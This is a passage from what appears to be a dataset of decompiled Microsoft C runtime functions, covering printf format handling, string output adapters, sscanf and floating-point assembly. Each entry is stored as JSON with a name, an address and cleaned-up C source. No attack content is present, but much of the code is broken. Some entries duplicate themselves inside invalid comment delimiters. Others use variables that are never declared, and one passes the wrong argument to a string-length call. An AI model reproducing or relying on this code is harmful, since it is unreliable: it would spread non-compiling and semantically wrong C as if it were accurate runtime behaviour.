|| (ushort_pointer == (ushort *)0x58)) {\n                    *(undefined4 *)((int)input_param + 0x2c) = 9; \n                }\n            } \n            \n            else if (ushort_pointer == (ushort *)0x4c) {\n                *(undefined4 *)((int)input_param + 0x2c) = 8; \n            } \n            else if (ushort_pointer == (ushort *)0x54) {\n                *(undefined4 *)((int)input_param + 0x2c) = 0xd; \n            } \n            else if (ushort_pointer == (ushort *)0x68) {\n                ushort *secondary_ushort_pointer = *(ushort **)(input_param + 2); \n                *(undefined4 *)((int)input_param + 0x2c) = (*secondary_ushort_pointer == 0x68) ? 1 : 2; \n                if (*secondary_ushort_pointer == 0x68) {\n                    *(ushort **)(input_param + 2) = secondary_ushort_pointer + 1; \n                }\n            }\n        } \n        \n        else if (ushort_pointer == (ushort *)0x6c) {\n            ushort *secondary_ushort_pointer = *(ushort **)(input_param + 2); \n            *(undefined4 *)((int)input_param + 0x2c) = (*secondary_ushort_pointer == 0x6c) ? 4 : 3; \n            if (*secondary_ushort_pointer == 0x6c) {\n                *(ushort **)(input_param + 2) = secondary_ushort_pointer + 1; \n            }\n        } \n        \n        else if (ushort_pointer == (ushort *)0x74) {\n            *(undefined4 *)((int)input_param + 0x2c) = 7; \n        } \n        else if (ushort_pointer == (ushort *)0x77) {\n            *(undefined4 *)((int)input_param + 0x2c) = 0xc; \n        } \n        else if (ushort_pointer == (ushort *)0x7a) {\n            *(undefined4 *)((int)input_param + 0x2c) = 6; \n        }\n    }\n    return CONCAT31((int3)((uint)ushort_pointer >> 8), 1); \n}"}
{"Function Name": "state_case_width", "Address": "1001ce4b", "Source Code": "undefined4 __fastcall state_case_width(void *input_pointer)\n{\n    int computed_value; \n    \n    if (*(char *)((int)input_pointer + 0x31) != '*') {\n        \n        return FUN_1001c1df(input_pointer, (long *)((int)input_pointer + 0x24));\n    }\n    \n    *(int *)((int)input_pointer + 0x14) += 4;\n    \n    computed_value = *(int *)((int)input_pointer + 0x14) - 4;\n    \n    *(int *)((int)input_pointer + 0x24) = computed_value;\n    \n    if (computed_value < 0) {\n        \n        *(uint *)((int)input_pointer + 0x20) |= 4;\n        \n        *(int *)((int)input_pointer + 0x24) = -computed_value;\n    }\n    \n    return CONCAT31((int3)((uint)computed_value >> 8), 1);\n}"}
{"Function Name": "state_case_width", "Address": "1001ce76", "Source Code": "undefined4 __fastcall state_case_width(void *input_param)\n{\n    \n    if (*(short *)((int)input_param + 0x32) != 0x2a) {\n        \n        return FUN_1001c257(input_param, (long *)((int)input_param + 0x24));\n    }\n    \n    \n    *(int *)((int)input_param + 0x14) += 4;\n    \n    \n    int temp_value = *(int *)((int)input_param + 0x14) - 4;\n    \n    \n    *(int *)((int)input_param + 0x24) = temp_value;\n    \n    \n    if (temp_value < 0) {\n        \n        *(uint *)((int)input_param + 0x20) |= 4;\n        \n        \n        *(int *)((int)input_param + 0x24) = -temp_value;\n    }\n    \n    \n    return CONCAT31((int3)((uint)temp_value >> 8), 1);\n}"}
{"Function Name": "__crt_stdio_output::to_integer_size", "Address": "1001cea2", "Source Code": "uint __cdecl __crt_stdio_output::to_integer_size(length_modifier length_modifier)\n{\n    \n    switch(length_modifier) {\n        \n        case 0:\n        case 3:\n        case 6:\n        case 7:\n        case 9:\n        case 10:\n            return 4; \n        case 1:\n            return 1; \n        case 2:\n            return 2; \n        \n        case 4:\n        case 5:\n        case 0xb:\n            return 8; \n        default:\n            return 0; \n    }\n}"}
{"Function Name": "type_case_Z", "Address": "1001cefe", "Source Code": "undefined4 __fastcall type_case_Z(__uint64 *parameters)\n{\n    ushort *ushortPointer; \n    int integerValue;      \n    uint unsignedIntValue;     \n    *(int *)((int)parameters + 0x14) += 4; \n    unsignedIntValue = *(uint *)((int)parameters + 0x14); \n    ushortPointer = *(ushort **)(unsignedIntValue - 4); \n    \n    \n    if ((ushortPointer == (ushort *)0x0) || (integerValue = *(int *)(ushortPointer + 2), integerValue == 0)) {\n        *(char **)((int)parameters + 0x34) = \"(null)\"; \n        *(undefined4 *)(parameters + 7) = 6; \n    } else {\n        *(int *)((int)parameters + 0x34) = integerValue; \n        unsignedIntValue = (uint)*ushortPointer; \n        \n        if (__crt_stdio_output::is_wide_character_specifier<char>(*parameters, *(char *)((int)parameters + 0x31), *(length_modifier *)((int)parameters + 0x2c))) {\n            unsignedIntValue = (uint)(*ushortPointer >> 1); \n            *(uint *)(parameters + 7) = unsignedIntValue; \n            *(undefined *)((int)parameters + 0x3c) = 1; \n            return CONCAT31((int3)(unsignedIntValue >> 8), 1); \n        }\n        *(uint *)(parameters + 7) = unsignedIntValue; \n    }\n    *(undefined *)((int)parameters + 0x3c) = 0; \n    return CONCAT31((int3)(unsignedIntValue >> 8), 1); \n}"}
{"Function Name": "type_case_Z", "Address": "1001cf61", "Source Code": "undefined4 __fastcall type_case_Z(__uint64 *parameters)\n{\n    ushort *ushortPointer; \n    int integerValue;      \n    uint unsignedIntValue;     \n    \n    *(int *)((int)parameters + 0x14) += 4;\n    \n    \n    unsignedIntValue = *(uint *)((int)parameters + 0x14);\n    \n    \n    ushortPointer = *(ushort **)(unsignedIntValue - 4);\n    \n    \n    if (ushortPointer == (ushort *)0x0 || (integerValue = *(int *)(ushortPointer + 2), integerValue == 0)) {\n        \n        *(char **)((int)parameters + 0x34) = \"(null)\";\n        \n        *(undefined4 *)(parameters + 7) = 6;\n    } else {\n        \n        *(int *)((int)parameters + 0x34) = integerValue;\n        \n        \n        unsignedIntValue = (uint)*ushortPointer;\n        \n        \n        if (__crt_stdio_output::is_wide_character_specifier<wchar_t>(*parameters, *(wchar_t *)((int)parameters + 0x32), *(length_modifier *)((int)parameters + 0x2c))) {\n            \n            unsignedIntValue = (uint)(*ushortPointer >> 1);\n            \n            *(uint *)(parameters + 7) = unsignedIntValue;\n            \n            *(undefined *)((int)parameters + 0x3c) = 1;\n        } else {\n            \n            *(uint *)(parameters + 7) = unsignedIntValue;\n            \n            *(undefined *)((int)parameters + 0x3c) = 0;\n        }\n    }\n    \n    \n    return CONCAT31((int3)(unsignedIntValue >> 8), 1);\n}"}
{"Function Name": "type_case_n", "Address": "1001d658", "Source Code": "uint __fastcall type_case_n(int input_param)\n{\n    \n    uint *uint_pointer = *(uint **)(*(int *)(input_param + 0x14) + 4);\n    \n    \n    *(int *)(input_param + 0x14) += 4;\n    \n    \n    int output_count = __get_printf_count_output();\n    uint length_size;\n    \n    if (output_count == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        \n        length_size = FUN_1001de96() & 0xffffff00;\n    } else {\n        \n        length_size = __crt_stdio_output::to_integer_size(*(length_modifier *)(input_param + 0x2c));\n        \n        \n        if (length_size == 1) {\n            \n            *(undefined *)uint_pointer = *(undefined *)(input_param + 0x18);\n        } else if (length_size == 2) {\n            \n            *(ushort *)uint_pointer = *(ushort *)(input_param + 0x18);\n        } else if (length_size == 4) {\n            \n            *uint_pointer = *(uint *)(input_param + 0x18);\n        } else if (length_size == 8) {\n            \n            *uint_pointer = *(uint *)(input_param + 0x18);\n            uint_pointer[1] = (int)(*(uint *)(input_param + 0x18)) >> 0x1f;\n        } else {\n            \n            return *(undefined4 *)FUN_100253b8() = 0x16, FUN_1001de96() & 0xffffff00;\n        }\n    }\n    \n    \n    *(undefined *)(input_param + 0x30) = 1;\n    \n    \n    return CONCAT31((int3)(length_size >> 8), 1);\n}"}
{"Function Name": "type_case_o", "Address": "1001d6cc", "Source Code": "void __fastcall type_case_o(void *input_pointer)\n{\n    \n    if ((*(uint *)((int)input_pointer + 0x20) >> 5 & 1) != 0) {\n        \n        *(uint *)((int)input_pointer + 0x20) |= 0x80;\n    }\n    \n    function_call(input_pointer, 8, '\\0');\n}"}
{"Function Name": "type_case_o", "Address": "1001d6eb", "Source Code": "void __fastcall type_case_o(void *input_pointer)\n{\n    \n    if (*(uint *)((int)input_pointer + 0x20) & 0x20) {\n        \n        *(uint *)((int)input_pointer + 0x20) |= 0x80;\n    }\n    \n    function_call(input_pointer, 8, '\\0');\n}"}
{"Function Name": "FUN_1001d70a", "Address": "1001d70a", "Source Code": "void __fastcall FUN_1001d70a(void *input_structure)\n{\n    \n    *(undefined4 *)((int)input_structure + 0x28) = 8;\n    \n    *(undefined4 *)((int)input_structure + 0x2c) = 10;\n    \n    process_structure(input_structure, 0x10, '\\x01');\n}"}
{"Function Name": "FUN_1001d722", "Address": "1001d722", "Source Code": "void __fastcall FUN_1001d722(void *param_1)\n{\n    \n    *(undefined4 *)((int)param_1 + 0x28) = 8;\n    \n    \n    *(undefined4 *)((int)param_1 + 0x2c) = 10;\n    \n    \n    FUN_1001d506(param_1, 0x10, '\\x01');\n}"}
{"Function Name": "type_case_s", "Address": "1001d73a", "Source Code": "undefined4 __fastcall type_case_s(__uint64 *parameterArray)\n{\n    uint valueFromParamArray; \n    *(int *)((int)parameterArray + 0x14) += 4; \n    valueFromParamArray = *(uint *)(parameterArray + 5); \n    int retrievedInteger = *(int *)(*(int *)((int)parameterArray + 0x14) - 4); \n    *(int *)((int)parameterArray + 0x34) = retrievedInteger; \n    if (valueFromParamArray == 0xffffffff) { \n        valueFromParamArray = 0x7fffffff; \n    }\n    bool isWideCharacterSpecifier = __crt_stdio_output::is_wide_character_specifier<char> \n    (*parameterArray, *(char *)((int)parameterArray + 0x31), *(length_modifier *)((int)parameterArray + 0x2c)); \n    if (isWideCharacterSpecifier) { \n        if (retrievedInteger == 0) { \n            *(wchar_t **)((int)parameterArray + 0x34) = L\"(null)\"; \n        }\n        *(undefined *)((int)parameterArray + 0x3c) = 1; \n        valueFromParamArray = FUN_10028860(*(short **)((int)parameterArray + 0x34), valueFromParamArray); \n    } else { \n        if (retrievedInteger == 0) { \n            *(char **)((int)parameterArray + 0x34) = \"(null)\"; \n        }\n        valueFromParamArray = FUN_10028739(*(char **)((int)parameterArray + 0x34), valueFromParamArray); \n    }\n    *(uint *)(parameterArray + 7) = valueFromParamArray; \n    return CONCAT31((int3)(valueFromParamArray >> 8), 1); \n}"}
{"Function Name": "type_case_s", "Address": "1001d7ad", "Source Code": "undefined4 __fastcall type_case_s(__uint64 *input_array)\n{\n    uint computed_length; \n    *(int *)((int)input_array + 0x14) += 4; \n    computed_length = *(uint *)(input_array + 5); \n    int current_offset = *(int *)((int)input_array + 0x14) - 4; \n    *(int *)((int)input_array + 0x34) = current_offset; \n    if (computed_length == 0xffffffff) { \n        computed_length = 0x7fffffff; \n    }\n    bool is_wide_character = __crt_stdio_output::is_wide_character_specifier<wchar_t>\n    (*input_array, *(wchar_t *)((int)input_array + 0x32), *(length_modifier *)((int)input_array + 0x2c)); \n    if (is_wide_character) { \n        if (current_offset == 0) { \n            *(wchar_t **)((int)input_array + 0x34) = L\"(null)\"; \n        }\n        *(undefined *)((int)input_array + 0x3c) = 1; \n        computed_length = compute_wide_string_length(*(short **)((int)input_array + 0x34), computed_length); \n    } else { \n        if (current_offset == 0) { \n            *(char **)((int)input_array + 0x34) = \"(null)\"; \n        }\n        computed_length = compute_narrow_string_length(input_array, computed_length); \n    }\n    *(uint *)(input_array + 7) = computed_length; \n    return CONCAT31((int3)(computed_length >> 8), 1); \n}"}
{"Function Name": "__crt_strtox::c_string_character_source<wchar_t>::validate", "Address": "1001d861", "Source Code": "bool __thiscall\n__crt_strtox::c_string_character_source<wchar_t>::validate(c_string_character_source<wchar_t> *this)\n{\n    \n    if (*(int *)this == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n        \n        return false;\n    }\n    \n    return true;\n}"}
{"Function Name": "validate_and_update_state_at_end_of_format_string", "Address": "1001d87c", "Source Code": "uint __fastcall validate_and_update_state_at_end_of_format_string(int input_param)\n{\n    \n    if ((*(int *)(input_param + 0x1c) != 0) && (*(int *)(input_param + 0x1c) != 7)) {\n        \n        *(undefined4 *)get_address_function() = 0x16;\n        \n        return result_function() & 0xffffff00;\n    }\n    \n    return 1;\n}"}
{"Function Name": "__crt_stdio_output::string_output_adapter<char>::write_character", "Address": "1001d89e", "Source Code": "bool __thiscall\n__crt_stdio_output::string_output_adapter<char>::write_character\n(string_output_adapter<char> *this, char param_1, int *param_2)\n{\n    int iVar1 = *(int *)this; \n    \n    if (*(int *)(iVar1 + 8) == *(int *)(iVar1 + 4)) {\n        \n        if (*(char *)(iVar1 + 0xc) == '\\0') {\n            *param_2 = -1; \n            return false; \n        }\n        *param_2 += 1; \n    } else {\n        *param_2 += 1; \n        *(int *)(iVar1 + 8) += 1; \n        ***(char ***)this = param_1; \n        **(int **)this += 1; \n    }\n    return true; \n}"}
{"Function Name": "__crt_stdio_output::string_output_adapter<wchar_t>::write_character", "Address": "1001d8e0", "Source Code": "bool __thiscall\n__crt_stdio_output::string_output_adapter<wchar_t>::write_character\n(string_output_adapter<wchar_t> *this,wchar_t param_1,int *param_2)\n{\n    \n    if (*(int *)(*(int *)this + 8) == *(int *)(*(int *)this + 4)) {\n        \n        if (*(char *)(*(int *)this + 0xc) == '\\0') {\n            \n            *param_2 = -1;\n        } else {\n            \n            (*param_2)++;\n        }\n        \n        return false;\n    } else {\n        \n        (*param_2)++;\n        \n        *(int *)(*(int *)this + 8) += 1;\n        \n        ***(wchar_t ***)this = param_1;\n        \n        **(int **)this += 2;\n        \n        return true;\n    }\n}"}
{"Function Name": "__crt_stdio_output::string_output_adapter<char>::write_string", "Address": "1001da5a", "Source Code": "void __thiscall\n__crt_stdio_output::string_output_adapter<char>::write_string\n(string_output_adapter<char> *this, char *param_1, int param_2, int *param_3,\n__crt_deferred_errno_cache *param_4)\n{\n    \n    if (param_2 == 0) {\n        return; \n    }\n    \n    \n    undefined4 *puVar1 = *(undefined4 **)this;\n    \n    \n    if (puVar1[2] == puVar1[1]) {\n        \n        if (*(char *)(puVar1 + 3) == '\\0') {\n            *param_3 = -1; \n            return;\n        }\n    } else {\n        \n        uint uVar2 = puVar1[1] - puVar1[2];\n        \n        \n        if ((uint)param_2 <= uVar2) {\n            uVar2 = param_2; \n        }\n        \n        \n        FUN_10018670((undefined8 *)*puVar1, (undefined8 *)param_1, uVar2);\n        \n        \n        **(int **)this += uVar2;\n        \n        \n        *(int *)(*(int *)this + 8) += uVar2;\n        \n        \n        if (*(char *)(*(int *)this + 0xc) == '\\0') {\n            \n            if (uVar2 == param_2) {\n                *param_3 += uVar2; \n                return;\n            }\n            \n            *param_3 = -1; \n            return;\n        }\n    }\n    \n    \n    *param_3 += param_2; \n}"}
{"Function Name": "__crt_stdio_output::string_output_adapter<wchar_t>::write_string", "Address": "1001dac1", "Source Code": "void __thiscall\n__crt_stdio_output::string_output_adapter<wchar_t>::write_string\n(string_output_adapter<wchar_t> *this, wchar_t *param_1, int param_2, int *param_3,\n__crt_deferred_errno_cache *param_4)\n{\n    \n    if (param_2 == 0) {\n        return; \n    }\n    \n    \n    undefined4 *puVar1 = *(undefined4 **)this;\n    \n    \n    if (puVar1[2] == puVar1[1]) {\n        \n        if (*(char *)(puVar1 + 3) == '\\0') {\n            *param_3 = -1; \n            return;\n        }\n    } else {\n        \n        uint uVar2 = puVar1[1] - puVar1[2];\n        \n        \n        if ((uint)param_2 <= uVar2) {\n            uVar2 = param_2; \n        }\n        \n        \n        FUN_10018670((undefined8 *)*puVar1, (undefined8 *)param_1, uVar2 * 2);\n        \n        \n        **(int **)this += uVar2 * 2;\n        \n        \n        *(int *)(*(int *)this + 8) += uVar2;\n        \n        \n        if (*(char *)(*(int *)this + 0xc) == '\\0') {\n            \n            if (uVar2 == param_2) {\n                *param_3 += uVar2; \n                return;\n            }\n            *param_3 = -1; \n            return;\n        }\n    }\n    \n    \n    *param_3 += param_2;\n}"}
{"Function Name": "FUN_1001de96", "Address": "1001de96", "Source Code": "void validateParameters(void) \n{\n    handleInvalidParameter(NULL, NULL, NULL, 0, 0); \n}"}
{"Function Name": "__invoke_watson", "Address": "1001dec3", "Source Code": "void __cdecl\n__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)\n{\n    \n    if (IsProcessorFeaturePresent(0x17)) {\n        \n        ((code *)swi(0x29))();\n    }\n    \n    ___acrt_call_reportfault(2, 0xc0000417, 1);\n    \n    TerminateProcess(GetCurrentProcess(), 0xc0000417);\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_ind<double>", "Address": "1001df76", "Source Code": "void __cdecl __crt_strtox::assemble_floating_point_ind<double>(double *floating_point_ptr)\n{\n    \n    *(uint *)((int)floating_point_ptr + 4) |= 0x80000000 | 0x7ff00000;\n    \n    *(undefined4 *)floating_point_ptr = 0;\n    \n    *(uint *)((int)floating_point_ptr + 4) = (*(uint *)((int)floating_point_ptr + 4) & 0xfff80000) | 0x80000;\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_infinity<double>", "Address": "1001dfa5", "Source Code": "\\*\nvoid __cdecl __crt_strtox::assemble_floating_point_infinity<double>(bool is_negative, double *double_pointer)\n{\n    \n    *(uint *)((int)double_pointer + 4) = (uint)is_negative << 0x1f | *(uint *)((int)double_pointer + 4) & 0x7fffffff | 0x7ff00000;\n    \n    \n    *(uint *)((int)double_pointer + 4) &= 0xfff00000;\n}\n*\\ \n \nvoid __cdecl __crt_strtox::assemble_floating_point_infinity<double>(bool is_negative, double *double_pointer)\n{\n    *(uint *)((int)double_pointer + 4) = (uint)is_negative << 0x1f | *(uint *)((int)double_pointer + 4) & 0x7fffffff | 0x7ff00000;\n    *(uint *)((int)double_pointer + 4) &= 0xfff00000;\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_qnan<double>", "Address": "1001dfe4", "Source Code": "\\*\nvoid __cdecl __crt_strtox::assemble_floating_point_qnan<double>(bool is_negative, double *double_pointer)\n{\n    \n    *(uint *)((int)double_pointer + 4) = (uint)is_negative << 0x1f | *(uint *)((int)double_pointer + 4) & 0x7fffffff | 0x7ff00000 | 0xfffff;\n    \n    \n    *(undefined4 *)double_pointer = 0xffffffff;\n}\n*\\ \n \nvoid __cdecl __crt_strtox::assemble_floating_point_qnan<double>(bool is_negative,double *double_pointer)\n{\n    *(uint *)((int)double_pointer + 4) = (uint)is_negative << 0x1f | *(uint *)((int)double_pointer + 4) & 0x7fffffff | 0x7ff00000 | 0xfffff;\n    *(undefined4 *)double_pointer = 0xffffffff;\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_snan<double>", "Address": "1001e023", "Source Code": "\\*\nvoid __cdecl __crt_strtox::assemble_floating_point_snan<double>(bool is_sign_bit_set, double *double_pointer)\n{\n    \n    *(uint *)((int)double_pointer + 4) = (uint)is_sign_bit_set << 0x1f | (*(uint *)((int)double_pointer + 4) & 0x7fffffff) | 0x7ff00000 & 0xfff00000;\n    \n    \n    *(undefined4 *)double_pointer = 1;\n}\n*\\ \n \nvoid __cdecl __crt_strtox::assemble_floating_point_snan<double>(bool is_sign_bit_set, double *double_pointer)\n{\n    *(uint *)((int)double_pointer + 4) = (uint)is_sign_bit_set << 0x1f | (*(uint *)((int)double_pointer + 4) & 0x7fffffff) | 0x7ff00000 & 0xfff00000;\n    *(undefined4 *)double_pointer = 1;\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_value_t<float>", "Address": "1001e067", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::assemble_floating_point_value_t<float>\n(bool param_1, int param_2, __uint64 param_3, float *param_4)\n{\n    \n    *param_4 = (float)((param_2 + 0x7fU & 0xff) << 0x17 | \n                       (uint)param_1 << 0x1f |            \n                       (uint)param_3 & 0x7fffff);          \n    return 0; \n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_value_t<double>", "Address": "1001e097", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::assemble_floating_point_value_t<double>\n(bool param_1, int param_2, __uint64 param_3, double *param_4)\n{\n    \n    *(uint *)((int)param_4 + 4) = (uint)param_1 << 0x1f | *(uint *)((int)param_4 + 4) & 0x7fffffff;\n    \n    *(uint *)((int)param_4 + 4) = ((param_2 + 0x3ffU & 0x7ff) << 0x14) | (*(uint *)((int)param_4 + 4) & 0x800fffff);\n    \n    *(uint *)((int)param_4 + 4) ^= (*(uint *)((int)param_4 + 4) ^ param_3._4_4_) & 0xfffff;\n    \n    *(uint *)param_4 ^= (uint)param_3;\n    \n    return 0;\n}"}
{"Function Name": "__crt_strtox::assemble_floating_point_zero<double>", "Address": "1001e0f6", "Source Code": "\\*\nvoid __cdecl __crt_strtox::assemble_floating_point_zero<double>(bool is_negative, double *floating_point_number)\n{\n    \n    *(uint *)((int)floating_point_number + 4) = (uint)is_negative << 0x1f | *(uint *)((int)floating_point_number + 4) & 0x7fffffff;\n    \n    *(uint *)((int)floating_point_number + 4) = *(uint *)((int)floating_point_number + 4) & 0x800fffff;\n    \n    *(uint *)((int)floating_point_number + 4) = *(uint *)((int)floating_point_number + 4) & 0xfff00000;\n}\n*\\ \n \nvoid __cdecl __crt_strtox::assemble_floating_point_zero<double>(bool is_negative,double *floating_point_number)\n{\n    *(uint *)((int)floating_point_number + 4) = (uint)is_negative << 0x1f | *(uint *)((int)floating_point_number + 4) & 0x7fffffff;\n    *(uint *)((int)floating_point_number + 4) = *(uint *)((int)floating_point_number + 4) & 0x800fffff;\n    *(uint *)((int)floating_point_number + 4) = *(uint *)((int)floating_point_number + 4) & 0xfff00000;\n}"}
{"Function Name": "common_vsscanf<wchar_t>", "Address": "1001e135", "Source Code": "\\*\nint __cdecl\ncommon_vsscanf<wchar_t>\n(__uint64 param_1, wchar_t *param_2, uint param_3, wchar_t *param_4,\n__crt_locale_pointers *param_5, char *param_6)\n{\n    undefined4 *puVar1; \n    int iVar2; \n    uint uVar3; \n    int local_20; \n    wchar_t local_1c[4]; \n    wchar_t *local_10; \n    wchar_t *local_c; \n    \n    if ((param_2 == (wchar_t *)0x0) || (param_4 == (wchar_t *)0x0)) {\n        puVar1 = (undefined4 *)FUN_100253b8(); \n        *puVar1 = 0x16; \n        FUN_1001de96(); \n        iVar2 = -1; \n    }\n    else {\n        uVar3 = FUN_10028860(param_2, param_3); \n        FUN_1001bfff(&local_20, (__acrt_ptd **)param_5); \n        local_c = param_2 + uVar3; \n        local_10 = param_2; \n        \n        input_processor<wchar_t, class___crt_stdio_input::string_input_adapter<wchar_t>_> local_80;\n        local_80 = input_processor<wchar_t, class___crt_stdio_input::string_input_adapter<wchar_t>_>(local_10, CONCAT44(param_4, param_1._4_4_), local_1c, (__crt_locale_pointers *)param_6);\n        iVar2 = local_80.process(); \n        FID_conflict__free(local_34); \n        \n        if (local_14 != '\\0') {\n            *(uint *)(local_20 + 0x350) &= 0xfffffffd; \n        }\n    }\n    return iVar2; \n}\n*\\ \n \nint __cdecl\ncommon_vsscanf<wchar_t>\n(__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,\n__crt_locale_pointers *param_5,char *param_6)\n{\n    undefined4 *puVar1;\n    int iVar2;\n    uint uVar3;\n    int local_20;\n    wchar_t local_1c[4];\n    wchar_t *local_10;\n    wchar_t *local_c;\n    if ((param_2 == (wchar_t *)0x0) || (param_4 == (wchar_t *)0x0)) {\n        puVar1 = (undefined4 *)FUN_100253b8();\n        *puVar1 = 0x16;\n        FUN_1001de96();\n        iVar2 = -1;\n    }\n    else {\n        uVar3 = FUN_10028860(param_2,param_3);\n        FUN_1001bfff(&local_20,(__acrt_ptd **)param_5);\n        local_c = param_2 + uVar3;\n        local_10 = param_2;\n        input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> local_80;\n        local_80 = input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>(local_10, CONCAT44(param_4,param_1._4_4_), local_1c, (__crt_locale_pointers *)param_6);\n        iVar2 = local_80.process();\n        FID_conflict__free(local_34);\n        if (local_14 != '\\0') {\n            *(uint *)(local_20 + 0x350) &= 0xfffffffd;\n        }\n    }\n    return iVar2;\n}"}
{"Function Name": "__crt_strtox::convert_decimal_string_to_floating_type<float>", "Address": "1001e1d0", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::convert_decimal_string_to_floating_type<float>\n(floating_point_string *param_1, float *param_2)\n{\n    \n    return convert_decimal_string_to_floating_type_common(param_1, (floating_point_value *)&param_2);\n}"}
{"Function Name": "__crt_strtox::convert_decimal_string_to_floating_type<double>", "Address": "1001e1f3", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::convert_decimal_string_to_floating_type<double>\n(floating_point_string *param_1, double *param_2)\n{\n    \n    return convert_decimal_string_to_floating_type_common(param_1, (floating_point_value *)&param_2);\n}"}
{"Function Name": "__crt_strtox::convert_hexadecimal_string_to_floating_type<float>", "Address": "1001e216", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::convert_hexadecimal_string_to_floating_type<float>\n(floating_point_string *param_1, float *param_2)\n{\n    \n    return convert_hexadecimal_string_to_floating_type_common\n           (param_1, (floating_point_value *)&param_2);\n}"}
{"Function Name": "__crt_strtox::convert_hexadecimal_string_to_floating_type<double>", "Address": "1001e239", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::convert_hexadecimal_string_to_floating_type<double>\n(floating_point_string *param_1, double *param_2)\n{\n    \n    return convert_hexadecimal_string_to_floating_type_common\n    (param_1, (floating_point_value *)&param_2);\n}"}
{"Function Name": "__crt_strtox::is_overflow_condition<unsigned___int64>", "Address": "1001e25c", "Source Code": "bool __cdecl __crt_strtox::is_overflow_condition<unsigned___int64>(uint flags, __uint64 value)\n{\n    \n    if ((flags & 4) == 0 && \n        ((flags & 1) == 0 || \n        (((flags & 2) == 0 || ((uint)value < 0x80000000)) && \n        ((flags & 2) != 0 || ((uint)value < 0x7fffffff)) || \n        ((uint)value < 0x80000000)))) \n    {\n        return false; \n    }\n    return true; \n}"}
{"Function Name": "FUN_1001e3b3", "Address": "1001e3b3", "Source Code": "\\*\nuint __cdecl FUN_1001e3b3(int *param_1, int *param_2, int *param_3)\n{\n    char characterValue; \n    wchar_t wideCharacterValue; \n    undefined4 undefinedValue; \n    int integerValue; \n    uint unsignedIntegerValue; \n    uint localCalculation; \n    int localInteger; \n    int *localPointer1; \n    int *localPointer2; \n    int localCounter; \n    int localValue28; \n    int localValue2c; \n    localPointer1 = param_3 + 2; \n    undefinedValue = FUN_10023785(param_2); \n    if ((char)undefinedValue == '\\0') { \n        return 7; \n    }\n    \n    localValue2c = param_2[4]; \n    localValue28 = param_2[5]; \n    wchar_t local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n    localPointer2 = param_3 + 0xc2; \n    *(bool *)localPointer2 = (wchar_t)local_c == L'-'; \n    \n    if (((wchar_t)local_c == L'-') || ((wchar_t)local_c == L'+')) {\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n    }\n    \n    if (((wchar_t)local_c == L'I') || ((wchar_t)local_c == L'i')) {\n        characterValue = parse_floating_point_possible_infinity<>((wchar_t *)&local_c, (input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, localValue2c, localValue28); \n        return CONCAT31(extraout_var, characterValue); \n    }\n    \n    if (((wchar_t)local_c == L'N') || ((wchar_t)local_c == L'n')) {\n        unsignedIntegerValue = parse_floating_point_possible_nan<>((wchar_t *)&local_c, (input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, localValue2c, localValue28); \n        return unsignedIntegerValue; \n    }\n    localInteger = 0; \n    char localFlag = '\\0'; \n    characterValue = '\\0'; \n    \n    if ((wchar_t)local_c == L'0') {\n        integerValue = param_2[4]; \n        wideCharacterValue = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n        \n        if ((wideCharacterValue == L'x') || (wideCharacterValue == L'X')) {\n            localFlag = '\\x01'; \n            local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n            localValue2c = integerValue; \n        } else {\n            __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2, wideCharacterValue); \n        }\n    }\n    bool bVar11 = false; \n    localCounter = 0; \n    \n    if ((wchar_t)local_c == L'0') {\n        bVar11 = true; \n        do {\n            local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2); \n        } while ((wchar_t)local_c == L'0'); \n    }\n    localCalculation = ((characterValue == '\\0') - 1 & 6) + 9; \n    do {\n        \n        if ((ushort)(wchar_t)local_c < 0x30) goto LAB_1001e886; \n        \n        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\n            unsignedIntegerValue = (ushort)(wchar_t)local_c - 0x30; \n        } else {\n            \n            if ((ushort)(wchar_t)local_30 <= (ushort)(wchar_t)local_c) {\n                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) {\n                    unsignedIntegerValue = (ushort)(wchar_t)local_c - 0xff10; \n                } else {\n                    unsignedIntegerValue = 0xffffffff; \n                }\n            } else {\n                \n                if ((ushort)(wchar_t)local_34 <= (ushort)(wchar_t)local_c) {\n                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_38) {\n                        unsignedIntegerValue = (ushort)(wchar_t)local_c - 